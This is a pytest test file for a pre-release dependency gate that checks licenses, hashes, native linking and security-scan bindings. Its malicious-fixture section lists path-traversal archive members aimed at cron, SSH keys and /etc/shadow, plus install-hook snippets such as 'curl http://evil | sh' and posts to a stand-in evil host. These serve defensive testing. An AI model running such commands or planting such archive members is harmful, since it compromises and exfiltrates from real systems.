"""Fail-closed pre-publish dependency gate behaviour (issue #2342).

Every RED case below builds a complete, otherwise-passing capture and mutates
exactly one fact, so each failure is attributable. Assertions are on the gate's
stable machine-readable codes, never on prose.
"""

from __future__ import annotations

import hashlib
import json
from pathlib import Path
from typing import Any

import pytest

from scripts.ci import release_dependency_gate as gate
from scripts.ci import spdx_license_policy as policy

SOURCE_SHA = "a" * 40
REPOSITORY = "ContextualWisdomLab/fast-mlsirm"


def _hash(label: str) -> str:
    """Return a deterministic synthetic sha256 for one capture subject."""
    return hashlib.sha256(label.encode("utf-8")).hexdigest()


PY_HASH = _hash("greenlib-1.0.0")
CRATE_HASH = _hash("greencrate-0.1.0")


def _python_evidence(**overrides: Any) -> dict[str, Any]:
    """Build one passing Python dependency evidence document."""
    evidence: dict[str, Any] = {
        "ecosystem": "pypi",
        "name": "greenlib",
        "version": "1.0.0",
        "source_sha256": PY_HASH,
        "license_expression": "MIT",
        "license": "",
        "classifiers": [],
        "distribution_inclusion": ["sdist", "wheel"],
        "known_vulnerabilities": [],
        "license_texts": {"LICENSE": "MIT License\n\nPermission is hereby granted"},
        "install_hook_sources": {},
        "archive_members": [{"type": "file", "name": "greenlib/__init__.py", "linkname": ""}],
        "parsed_inputs": ["greenlib/__init__.py"],
        "native_libraries": [
            {
                "path": "greenlib/_speed.so",
                "needed": ["libc.so.6", "libgcc_s.so.1", "libpython3.13.so.1.0"],
                "static_archives": [],
            }
        ],
        "bundled_library_licenses": {},
    }
    evidence.update(overrides)
    return evidence


def _cargo_evidence(**overrides: Any) -> dict[str, Any]:
    """Build one passing Cargo dependency evidence document."""
    evidence: dict[str, Any] = {
        "ecosystem": "cargo",
        "name": "greencrate",
        "version": "0.1.0",
        "source_sha256": CRATE_HASH,
        "license_expression": "Apache-2.0",
        "license": "",
        "classifiers": [],
        "distribution_inclusion": ["wheel"],
        "known_vulnerabilities": [],
        "license_texts": {},
        "install_hook_sources": {},
        "archive_members": [{"type": "file", "name": "greencrate/src/lib.rs", "linkname": ""}],
        "parsed_inputs": ["src/lib.rs"],
        "native_libraries": [],
        "bundled_library_licenses": {},
    }
    evidence.update(overrides)
    return evidence


CARGO_LOCK = f"""
version = 4

[[package]]
name = "fast-mlsirm"
version = "0.11.5"

[[package]]
name = "greencrate"
version = "0.1.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "{CRATE_HASH}"
"""

CARGO_METADATA: dict[str, Any] = {
    "packages": [
        {"id": "root-id", "name": "fast-mlsirm", "version": "0.11.5", "source": None},
        {
            "id": "greencrate-id",
            "name": "greencrate",
            "version": "0.1.0",
            "source": "registry+https://github.com/rust-lang/crates.io-index",
            "license": "Apache-2.0",
        },
    ],
    "resolve": {
        "root": "root-id",
        "nodes": [
            {
                "id": "root-id",
                "deps": [{"pkg": "greencrate-id", "dep_kinds": [{"kind": "build"}]}],
            },
            {"id": "greencrate-id", "deps": []},
        ],
    },
}


def _write(path: Path, payload: Any) -> None:
    """Write one JSON capture member, creating parents as needed."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload, indent=2, sort_keys=True) + "\n", encoding="utf-8")


def _write_binding(root: Path, dependency: gate.Dependency, evidence: dict[str, Any]) -> None:
    """Write the structured Strix binding that matches one dependency's fixture."""
    fixture = gate.build_fixture(dependency, evidence)
    _write(
        root / "strix" / "bindings" / f"{dependency.slug}.json",
        {
            "schema": gate.BINDING_SCHEMA,
            "dependency": fixture["dependency"],
            "fixture": {
                "id": dependency.key,
                "sha256": gate.fixture_digest(fixture),
                "scenarios": list(gate.REQUIRED_SCENARIOS),
            },
            "source_sha": SOURCE_SHA,
            "findings": [],
            "verdict": "no_exploitable_findings",
        },
    )


def build_capture(
    root: Path,
    *,
    python_evidence: dict[str, Any] | None = None,
    cargo_evidence: dict[str, Any] | None = None,
    lock_text: str | None = None,
    installed: dict[str, Any] | None = None,
    selections: list[dict[str, str]] | None = None,
) -> Path:
    """Build a complete GREEN capture tree, applying the caller's single mutation."""
    python_evidence = python_evidence if python_evidence is not None else _python_evidence()
    cargo_evidence = cargo_evidence if cargo_evidence is not None else _cargo_evidence()
    _write(
        root / "release.json",
        {
            "source_repository": REPOSITORY,
            "source_sha": SOURCE_SHA,
            "ecosystems": ["python", "cargo"],
        },
    )
    (root / "python").mkdir(parents=True, exist_ok=True)
    (root / "python" / "lock.txt").write_text(
        lock_text
        if lock_text is not None
        else f"greenlib==1.0.0 \\\n    --hash=sha256:{PY_HASH}\n",
        encoding="utf-8",
    )
    _write(
        root / "python" / "installed.json",
        installed
        if installed is not None
        else {"installed": [{"metadata": {"name": "greenlib", "version": "1.0.0"}}]},
    )
    (root / "cargo").mkdir(parents=True, exist_ok=True)
    (root / "cargo" / "Cargo.lock").write_text(CARGO_LOCK, encoding="utf-8")
    _write(root / "cargo" / "metadata.json", CARGO_METADATA)

    python_dependency = gate.Dependency("pypi", "greenlib", "1.0.0")
    cargo_dependency = gate.Dependency("cargo", "greencrate", "0.1.0")
    _write(root / "evidence" / f"{python_dependency.slug}.json", python_evidence)
    _write(root / "evidence" / f"{cargo_dependency.slug}.json", cargo_evidence)
    _write_binding(root, python_dependency, python_evidence)
    _write_binding(root, cargo_dependency, cargo_evidence)
    if selections is not None:
        _write(root / "license-selections.json", selections)
    return root


def _codes(report: gate.GateReport) -> set[str]:
    """Return the set of failure codes the gate produced."""
    return {failure.code for failure in report.failures}


# ---------------------------------------------------------------------------
# GREEN
# ---------------------------------------------------------------------------


def test_green_mit_apache_bsd_release_passes(tmp_path: Path) -> None:
    """An MIT Python dependency and an Apache-2.0 crate pass the whole gate."""
    report = gate.gate(build_capture(tmp_path))
    assert report.failures == []
    assert report.passed
    payload = report.to_json()
    assert payload["result"] == "PASS"
    assert payload["dependency_count"] == 2
    assert {row["key"] for row in payload["dependencies"]} == {
        "pypi/greenlib@1.0.0",
        "cargo/greencrate@0.1.0",
    }
    assert gate.SHA256_RE.fullmatch(payload["strix_evidence_binder_sha256"])


def test_green_release_exits_zero_through_the_cli(tmp_path: Path) -> None:
    """The CLI writes the report and exits 0 for a passing release."""
    capture = build_capture(tmp_path / "capture")
    report_path = tmp_path / "report.json"
    exit_code = gate.main(["gate", "--capture", str(capture), "--report", str(report_path)])
    assert exit_code == 0
    assert json.loads(report_path.read_text(encoding="utf-8"))["result"] == "PASS"


def test_green_bsd_dependency_with_selected_dual_license(tmp_path: Path) -> None:
    """A BSD-3-Clause dual license passes once the selection and rationale exist."""
    capture = build_capture(
        tmp_path,
        python_evidence=_python_evidence(license_expression="BSD-3-Clause OR GPL-2.0-only"),
        selections=[
            {
                "ecosystem": "pypi",
                "name": "greenlib",
                "version": "1.0.0",
                "chosen": "BSD-3-Clause",
                "rationale": "BSD-3-Clause selected; GPL option is never exercised",
            }
        ],
    )
    report = gate.gate(capture)
    assert report.failures == []
    row = next(row for row in report.dependencies if row["key"] == "pypi/greenlib@1.0.0")
    assert row["license"] == "BSD-3-Clause"
    assert "GPL option is never exercised" in row["license_selection_rationale"]


# ---------------------------------------------------------------------------
# RED: license denial
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("expression", "code"),
    [
        ("GPL-3.0-or-later", policy.LICENSE_DENIED_GPL),
        ("LGPL-2.1-only", policy.LICENSE_DENIED_LGPL),
        ("AGPL-3.0-only", policy.LICENSE_DENIED_AGPL),
    ],
)
def test_red_copyleft_dependency_is_refused(
    tmp_path: Path, expression: str, code: str
) -> None:
    """A GPL, LGPL, or AGPL dependency independently refuses the release."""
    capture = build_capture(
        tmp_path, python_evidence=_python_evidence(license_expression=expression)
    )
    report = gate.gate(capture)
    assert code in _codes(report)
    assert not report.passed


def test_red_unknown_license_is_refused(tmp_path: Path) -> None:
    """A dependency with no usable license declaration refuses the release."""
    capture = build_capture(
        tmp_path,
        python_evidence=_python_evidence(
            license_expression="", license="", classifiers=[]
        ),
    )
    assert policy.LICENSE_MISSING in _codes(gate.gate(capture))


def test_red_noassertion_license_is_refused(tmp_path: Path) -> None:
    """``NOASSERTION`` is refused rather than treated as informational."""
    capture = build_capture(
        tmp_path, python_evidence=_python_evidence(license_expression="NOASSERTION")
    )
    assert policy.LICENSE_UNRECOGNIZED in _codes(gate.gate(capture))


def test_red_bundled_gpl_text_contradicting_permissive_metadata(tmp_path: Path) -> None:
    """A dependency declaring MIT while shipping GPL text is a disagreement failure."""
    capture = build_capture(
        tmp_path,
        python_evidence=_python_evidence(
            license_texts={"COPYING": "GNU GENERAL PUBLIC LICENSE Version 3"}
        ),
    )
    assert gate.LICENSE_TEXT_DISAGREEMENT in _codes(gate.gate(capture))


def test_red_bundled_gpl_text_on_already_denied_metadata(tmp_path: Path) -> None:
    """Bundled copyleft text is reported even when the metadata already failed."""
    capture = build_capture(
        tmp_path,
        python_evidence=_python_evidence(
            license_expression="",
            license_texts={"COPYING": "GNU LESSER GENERAL PUBLIC LICENSE"},
        ),
    )
    assert gate.LICENSE_DENIED_IN_BUNDLED_TEXT in _codes(gate.gate(capture))


def test_red_dual_license_without_selection(tmp_path: Path) -> None:
    """A dual-licensed dependency with no recorded selection refuses the release."""
    capture = build_capture(
        tmp_path,
        python_evidence=_python_evidence(license_expression="MIT OR GPL-2.0-only"),
    )
    assert policy.LICENSE_SELECTION_REQUIRED in _codes(gate.gate(capture))


def test_license_falls_back_through_legacy_field_then_classifiers(tmp_path: Path) -> None:
    """Declaration precedence is License-Expression, then License, then classifiers."""
    legacy = build_capture(
        tmp_path / "legacy",
        python_evidence=_python_evidence(license_expression="", license="Apache-2.0"),
    )
    report = gate.gate(legacy)
    row = next(row for row in report.dependencies if row["ecosystem"] == "pypi")
    assert (row["license_source"], row["license"]) == ("License", "Apache-2.0")

    trove = build_capture(
        tmp_path / "trove",
        python_evidence=_python_evidence(
            license_expression="",
            license="",
            classifiers=["License :: OSI Approved :: MIT License"],
        ),
    )
    row = next(row for row in gate.gate(trove).dependencies if row["ecosystem"] == "pypi")
    assert (row["license_source"], row["license"]) == ("classifier", "MIT")


# ---------------------------------------------------------------------------
# RED: enumeration, hashes, and native linking
# ---------------------------------------------------------------------------


def test_red_lock_and_environment_disagree(tmp_path: Path) -> None:
    """An installed distribution absent from the lock refuses the release."""
    capture = build_capture(
        tmp_path,
        installed={
            "installed": [
                {"metadata": {"name": "greenlib", "version": "1.0.0"}},
                {"metadata": {"name": "sneaky", "version": "9.9.9"}},
            ]
        },
    )
    report = gate.gate(capture)
    assert gate.LOCK_ENV_MISMATCH in _codes(report)
    assert any("pypi/sneaky@9.9.9" == failure.subject for failure in report.failures)


def test_red_locked_requirement_missing_from_environment(tmp_path: Path) -> None:
    """A locked requirement that was never installed refuses the release too."""
    capture = build_capture(
        tmp_path,
        lock_text=(
            f"greenlib==1.0.0 --hash=sha256:{PY_HASH}\n"
            f"absent==2.0.0 --hash=sha256:{_hash('absent')}\n"
        ),
    )
    assert gate.LOCK_ENV_MISMATCH in _codes(gate.gate(capture))


def test_red_tampered_source_hash(tmp_path: Path) -> None:
    """A distribution whose bytes do not hash to the locked pin refuses the release."""
    capture = build_capture(
        tmp_path, python_evidence=_python_evidence(source_sha256=_hash("tampered"))
    )
    assert gate.SOURCE_HASH_MISMATCH in _codes(gate.gate(capture))


def test_red_missing_source_hash(tmp_path: Path) -> None:
    """Evidence with no source hash at all is a hash failure, not a skip."""
    capture = build_capture(tmp_path, python_evidence=_python_evidence(source_sha256=""))
    assert gate.SOURCE_HASH_MISMATCH in _codes(gate.gate(capture))


def test_red_gpl_static_link_target(tmp_path: Path) -> None:
    """A shipped native library statically linking a GPL archive refuses the release."""
    capture = build_capture(
        tmp_path,
        python_evidence=_python_evidence(
            native_libraries=[
                {
                    "path": "greenlib/_speed.so",
                    "needed": ["libc.so.6"],
                    "static_archives": [{"name": "libreadline.a", "license": "GPL-3.0-only"}],
                }
            ]
        ),
    )
    assert gate.NATIVE_LINK_DENIED in _codes(gate.gate(capture))


def test_red_undeclared_dynamic_link_target(tmp_path: Path) -> None:
    """A non-platform soname with no declared license refuses the release."""
    capture = build_capture(
        tmp_path,
        python_evidence=_python_evidence(
            native_libraries=[
                {"path": "greenlib/_speed.so", "needed": ["libmystery.so.3"], "static_archives": []}
            ]
        ),
    )
    assert gate.NATIVE_LINK_UNKNOWN in _codes(gate.gate(capture))


def test_declared_dynamic_link_target_is_recorded(tmp_path: Path) -> None:
    """A declared, permissive bundled library passes and is recorded in provenance."""
    capture = build_capture(
        tmp_path,
        python_evidence=_python_evidence(
            native_libraries=[
                {"path": "greenlib/_speed.so", "needed": ["libfoo.so.1"], "static_archives": []}
            ],
            bundled_library_licenses={"libfoo.so.1": "BSD-3-Clause"},
        ),
    )
    report = gate.gate(capture)
    assert report.failures == []
    row = next(row for row in report.dependencies if row["ecosystem"] == "pypi")
    assert {"name": "cwl:native:dynamic", "value": "libfoo.so.1=BSD-3-Clause"} in row[
        "native_properties"
    ]


def test_permissive_static_archive_is_recorded(tmp_path: Path) -> None:
    """An allowed static archive is recorded instead of refused."""
    capture = build_capture(
        tmp_path,
        python_evidence=_python_evidence(
            native_libraries=[
                {
                    "path": "greenlib/_speed.so",
                    "needed": [],
                    "static_archives": [{"name": "libz.a", "license": "Zlib"}],
                }
            ]
        ),
    )
    report = gate.gate(capture)
    assert report.failures == []
    row = next(row for row in report.dependencies if row["ecosystem"] == "pypi")
    assert {"name": "cwl:native:static", "value": "libz.a=Zlib"} in row["native_properties"]


def test_system_runtime_sonames_are_allowlisted_with_a_rationale(tmp_path: Path) -> None:
    """glibc and the GCC runtime are exempt and the exemption is written down."""
    report = gate.gate(build_capture(tmp_path))
    row = next(row for row in report.dependencies if row["ecosystem"] == "pypi")
    values = {item["value"] for item in row["native_properties"]}
    assert any(value.startswith("libc.so.6=LGPL-2.1-or-later") for value in values)
    assert any("GCC-exception-3.1" in value for value in values)
    assert any(value.startswith("libpython3.13.so.1.0=PSF-2.0") for value in values)


# ---------------------------------------------------------------------------
# RED: malicious fixtures
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "member",
    [
        {"type": "file", "name": "../../etc/cron.d/backdoor", "linkname": ""},
        {"type": "file", "name": "/etc/cron.d/backdoor", "linkname": ""},
        {"type": "symlink", "name": "pkg/link", "linkname": "../../../root/.ssh/authorized_keys"},
        {"type": "hardlink", "name": "pkg/link", "linkname": "/etc/shadow"},
        {"type": "file", "name": "", "linkname": ""},
    ],
)
def test_red_archive_path_escape(tmp_path: Path, member: dict[str, str]) -> None:
    """Any archive member escaping the extraction root refuses the release."""
    capture = build_capture(
        tmp_path, python_evidence=_python_evidence(archive_members=[member])
    )
    assert gate.ARCHIVE_PATH_ESCAPE in _codes(gate.gate(capture))


def test_red_windows_drive_letter_member(tmp_path: Path) -> None:
    """A drive-qualified member name is an absolute path escape."""
    capture = build_capture(
        tmp_path,
        python_evidence=_python_evidence(
            archive_members=[{"type": "file", "name": "C:\\windows\\system32\\evil", "linkname": ""}]
        ),
    )
    assert gate.ARCHIVE_PATH_ESCAPE in _codes(gate.gate(capture))


@pytest.mark.parametrize(
    "source",
    [
        'cmdclass = {"install": Backdoor}',
        "import subprocess\nsubprocess.run(['curl', 'http://evil'])",
        "import os\nos.system('curl http://evil | sh')",
        "import os\nos.popen('id')",
        "import urllib.request",
        "import http.client",
        "requests.post('http://evil')",
        "socket.socket()",
        'std::process::Command::new("sh")',
        "reqwest::blocking::get(url)",
    ],
)
def test_red_untrusted_install_hook(tmp_path: Path, source: str) -> None:
    """An install or build hook that spawns or phones home refuses the release."""
    capture = build_capture(
        tmp_path, python_evidence=_python_evidence(install_hook_sources={"setup.py": source})
    )
    assert gate.INSTALL_HOOK in _codes(gate.gate(capture))


def test_cmdclass_single_quoted_command_is_detected(tmp_path: Path) -> None:
    """Single-quoted cmdclass keys are detected exactly like double-quoted ones."""
    capture = build_capture(
        tmp_path,
        python_evidence=_python_evidence(
            install_hook_sources={"setup.py": "cmdclass = {'develop': Hook, 'egg_info': Hook}"}
        ),
    )
    assert gate.INSTALL_HOOK in _codes(gate.gate(capture))


def test_benign_cmdclass_without_lifecycle_override_passes(tmp_path: Path) -> None:
    """A cmdclass that overrides only build_ext is not an install hook."""
    capture = build_capture(
        tmp_path,
        python_evidence=_python_evidence(
            install_hook_sources={"setup.py": 'cmdclass = {"build_ext": Builder}'}
        ),
    )
    assert gate.gate(capture).failures == []


# ---------------------------------------------------------------------------
# RED: Strix structured evidence
# ---------------------------------------------------------------------------


def test_red_missing_strix_binding(tmp_path: Path) -> None:
    """A dependency with no structured binding refuses the release."""
    capture = build_capture(tmp_path)
    (capture / "strix" / "bindings" / "pypi__greenlib__1.0.0.json").unlink()
    assert gate.STRIX_BINDING_MISSING in _codes(gate.gate(capture))


@pytest.mark.parametrize(
    "text",
    [
        "0 findings",
        "No exploitable vulnerabilities detected",
    ],
)
def test_red_textual_pass_is_never_accepted(tmp_path: Path, text: str) -> None:
    """A textual '0 findings' is rejected rather than treated as a pass."""
    capture = build_capture(tmp_path)
    (capture / "strix" / "bindings" / "pypi__greenlib__1.0.0.json").write_text(
        text, encoding="utf-8"
    )
    assert gate.STRIX_TEXTUAL_PASS_REJECTED in _codes(gate.gate(capture))


def test_red_json_string_evidence_is_rejected(tmp_path: Path) -> None:
    """Valid JSON that is merely a string is still prose, not a binding."""
    capture = build_capture(tmp_path)
    _write(
        capture / "strix" / "bindings" / "pypi__greenlib__1.0.0.json",
        "No exploitable vulnerabilities detected",
    )
    assert gate.STRIX_TEXTUAL_PASS_REJECTED in _codes(gate.gate(capture))


def test_red_summary_object_without_the_binding_schema(tmp_path: Path) -> None:
    """A JSON object carrying only a textual summary is rejected as prose."""
    capture = build_capture(tmp_path)
    _write(
        capture / "strix" / "bindings" / "pypi__greenlib__1.0.0.json",
        {"summary": "No exploitable vulnerabilities detected"},
    )
    assert gate.STRIX_TEXTUAL_PASS_REJECTED in _codes(gate.gate(capture))


def test_red_binding_without_the_declared_schema(tmp_path: Path) -> None:
    """A structured object that does not declare the contract is malformed."""
    capture = build_capture(tmp_path)
    _write(
        capture / "strix" / "bindings" / "pypi__greenlib__1.0.0.json",
        {"findings": [], "verdict": "no_exploitable_findings"},
    )
    assert gate.STRIX_BINDING_MALFORMED in _codes(gate.gate(capture))


def _binding(capture: Path) -> dict[str, Any]:
    """Read the Python dependency's structured binding for mutation."""
    return json.loads(
        (capture / "strix" / "bindings" / "pypi__greenlib__1.0.0.json").read_text(
            encoding="utf-8"
        )
    )


@pytest.mark.parametrize(
    ("mutation", "code"),
    [
        ({"dependency": {"ecosystem": "pypi", "name": "other", "version": "1.0.0"}},
         gate.STRIX_BINDING_UNBOUND),
        ({"dependency": "greenlib"}, gate.STRIX_BINDING_UNBOUND),
        ({"source_sha": "b" * 40}, gate.STRIX_BINDING_UNBOUND),
        ({"fixture": "greenlib"}, gate.STRIX_BINDING_MALFORMED),
        ({"findings": "none"}, gate.STRIX_BINDING_MALFORMED),
        ({"verdict": "looks fine to me"}, gate.STRIX_BINDING_MALFORMED),
        ({"verdict": "findings_present"}, gate.STRIX_FINDINGS_OPEN),
        ({"findings": [{"scenario": "install_hooks", "severity": "high"}]},
         gate.STRIX_FINDINGS_OPEN),
    ],
)
def test_red_binding_mutations(
    tmp_path: Path, mutation: dict[str, Any], code: str
) -> None:
    """Each structural defect in the binding refuses the release with its own code."""
    capture = build_capture(tmp_path)
    payload = _binding(capture)
    payload.update(mutation)
    _write(capture / "strix" / "bindings" / "pypi__greenlib__1.0.0.json", payload)
    assert code in _codes(gate.gate(capture))


def test_red_binding_names_a_different_fixture(tmp_path: Path) -> None:
    """A binding whose fixture digest is not this dependency's fixture is unbound."""
    capture = build_capture(tmp_path)
    payload = _binding(capture)
    payload["fixture"]["sha256"] = _hash("some other fixture")
    _write(capture / "strix" / "bindings" / "pypi__greenlib__1.0.0.json", payload)
    assert gate.STRIX_BINDING_UNBOUND in _codes(gate.gate(capture))


def test_red_binding_omits_a_required_scenario(tmp_path: Path) -> None:
    """A binding that does not cover every simulated surface is malformed."""
    capture = build_capture(tmp_path)
    payload = _binding(capture)
    payload["fixture"]["scenarios"] = ["file_parsing"]
    _write(capture / "strix" / "bindings" / "pypi__greenlib__1.0.0.json", payload)
    assert gate.STRIX_BINDING_MALFORMED in _codes(gate.gate(capture))


def test_red_missing_per_dependency_evidence(tmp_path: Path) -> None:
    """A resolved dependency with no captured evidence refuses the release."""
    capture = build_capture(tmp_path)
    (capture / "evidence" / "cargo__greencrate__0.1.0.json").unlink()
    assert gate.EVIDENCE_MISSING in _codes(gate.gate(capture))


def test_fixtures_are_isolated_per_dependency(tmp_path: Path) -> None:
    """Each dependency gets its own fixture, so one digest can never cover two."""
    python_fixture = gate.build_fixture(
        gate.Dependency("pypi", "greenlib", "1.0.0"), _python_evidence()
    )
    cargo_fixture = gate.build_fixture(
        gate.Dependency("cargo", "greencrate", "0.1.0"), _cargo_evidence()
    )
    assert gate.fixture_digest(python_fixture) != gate.fixture_digest(cargo_fixture)
    assert sorted(python_fixture["scenarios"]) == list(gate.REQUIRED_SCENARIOS)
    assert gate.fixture_digest(python_fixture) == gate.fixture_digest(
        gate.build_fixture(gate.Dependency("pypi", "greenlib", "1.0.0"), _python_evidence())
    )
